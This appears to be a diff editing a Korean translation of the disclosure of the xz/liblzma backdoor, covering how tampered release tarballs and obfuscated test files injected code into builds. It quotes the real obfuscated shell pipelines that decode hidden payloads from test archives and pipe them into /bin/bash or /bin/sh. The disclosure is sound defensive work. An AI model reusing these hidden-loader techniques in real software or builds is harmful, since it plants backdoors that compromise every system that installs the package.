@@ -5,25 +5,30 @@
 
 안녕하세요,
 
-저번 주에 간 데비안 불안정 버전 설치에 liblzma(xz 패키지의 일부)에 몇가지 이상한 현상(ssh로 로그인하는 데에 많은 CPU를 소모, valgrind 에러)이 있었고, 그에 대한 답을 알아냈습니다:
+저번 주에 간 데비안 불안정 버전 설치 중  
+liblzma(xz 패키지의 일부)에 몇가지 이상한 현상(ssh로 로그인하는 데에 많은 CPU를 소모, valgrind 에러)이 있었고,  
+그에 대한 답을 알아냈습니다:
 
 xz 레포지토리 제공부와 xz tarballs가 백도어로 쓰였습니다.
 
 처음에 저는 데비안 패키지의 손상이라 생각했으나, upstream의 문제로 밝혀졌습니다.
 
-
+<br>
 == 손상된 릴리즈 타르볼 ==
 
-백도어의 한 부분은 *배포된 tarballs에만 있습니다*. 참고로 여기 데비안의 tarball을 임포트한 링크가 있는데, 이는 5.6.0과 5.6.1 tarballs에도 존재합니다.
+백도어의 한 부분은 *배포된 tarballs에만 있습니다*.  
+참고로 여기 데비안의 tarball을 임포트한 링크가 있는데, 이는 5.6.0과 5.6.1 tarballs에도 존재합니다.
 
-https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63
+- https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63
 
-해당 라인은 제공부의 `build-to-host` 소스와 xz의 git에도 *없습니다.* 그러나 "소스 코드" 링크들을 제외하고, github가 레포지토리 컨텐츠로부터 직접 생성한 것으로 보이는 릴리즈된 upstream의 tarballs에는 존재하였습니다.
+해당 라인은 제공부의 `build-to-host` 소스와 xz의 git에도 *없습니다.*  
+그러나 "소스 코드" 링크들을 제외하고, github가 레포지토리 컨텐츠로부터 직접 생성한 것으로 보이는 릴리즈된 upstream의 tarballs에는 존재하였습니다.
 
-https://github.com/tukaani-project/xz/releases/tag/v5.6.0
-https://github.com/tukaani-project/xz/releases/tag/v5.6.1
+- https://github.com/tukaani-project/xz/releases/tag/v5.6.0  
+- https://github.com/tukaani-project/xz/releases/tag/v5.6.1
 
-이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다. 이 스크립트는 레포지토리의 `test`에 있는 .xz파일들이고, 난독화 되어있습니다.
+이것은 구성의 말미에 실행될 난독화된 스크립트를 주입합니다.  
+이 스크립트는 레포지토리의 `test`에 있는 .xz파일들이고, 난독화 되어있습니다.
 
 이 스크립트는 실행되고, 몇 가지 선제조건과 일치하면 하부 코드
 
@@ -40,7 +45,12 @@ sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
 이는
 
 ```bash
-...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...
+...
+;sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz
+| tr "	 \-_" " 	_\-"
+| xz -d
+| /bin/bash >/dev/null 2>&1;
+...
 ```
 
 로 끝납니다.
@@ -72,7 +82,10 @@ export i="((head -c +1024 >/dev/null) && head -c +2048
 && (head -c +1024 >/dev/null) && head -c +2048
 && (head -c +1024 >/dev/null) && head -c +2048
 && (head -c +1024 >/dev/null) && head -c +724)";
-(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma
+|eval $i
+|tail -c +31265
+|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")
 |xz -F raw --lzma1 -dc
 |/bin/sh
 ####World####
@@ -80,40 +93,39 @@ export i="((head -c +1024 >/dev/null) && head -c +2048
 
 난독화 해제 후 이는 injected.txt로 연결됩니다.
 
+<br>
+== 손상된 레포지토리 ==
 
-== Compromised Repository ==
+다수의 exploit을 보함한 upstream에서 커밋된 해당 파일들은 난독화된 형태를 띄고 있었습니다.
 
-The files containing the bulk of the exploit are in an obfuscated form in
-  tests/files/bad-3-corrupt_lzma2.xz
-  tests/files/good-large_compressed.lzma
-committed upstream. They were initially added in
-https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
+- tests/files/bad-3-corrupt_lzma2.xz  
+- tests/files/good-large_compressed.lzma
 
-Note that the files were not even used for any "tests" in 5.6.0.
+이 파일들은 하단 커밋에 처음으로 추가되었습니다.  
+- https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0
 
+참고로 5.6.0 버전에서 저 파일들은 어떠한 "tests"에도 사용되지 않았습니다.
 
-Subsequently the injected code (more about that below) caused valgrind errors
-and crashes in some configurations, due the stack layout differing from what
-the backdoor was expecting.  These issues were attempted to be worked around
-in 5.6.1:
+결과적으로 주입된 코드(하단에 추가 설명)는 valgrind 에러를 발생시킵니다.  
+그리고 백도어가 예상한 스택 레이아웃의 차이로 인해 일부 구성에서 충돌이 발생했습니다.  
+이 문제는 5.6.1에서 동작하도록 시도되었습니다.
 
-https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
-https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
-https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92
+- https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad
+- https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f
+- https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92
 
-For which the exploit code was then adjusted:
-https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
+이후 익스플로잇 코드가 수정되었습니다:
 
-Given the activity over several weeks, the committer is either directly
-involved or there was some quite severe compromise of their
-system. Unfortunately the latter looks like the less likely explanation, given
-they communicated on various lists about the "fixes" mentioned above.
+- https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89
 
+몇 주간 활동을 고려할 때, 커미터는 직접 연관이 있거나, 그들의 시스템에 상당히 심각한 손상이 있었을 것으로 보입니다.  
+유감스럽게도 상단에 언급한 "수정 사항"에 관해 여러 리스트에서 소통한 것으로 보아, 후자의 경우일 가능성은 낮아보입니다.
 
-Florian Weimer first extracted the injected code in isolation, also attached,
-liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!
+Florian Weimer가 처음으로 주입된 코드를 따로 추출했습니다.  
+또한 liblzma_la-crc64.fast.o를 첨부하였습니다.  
+저는 그저 전체 바이너리만을 보면 됐습니다. 감사합니다!
 
-
+<br>
 == Affected Systems ==
 
 The attached de-obfuscated script is invoked first after configure, where it
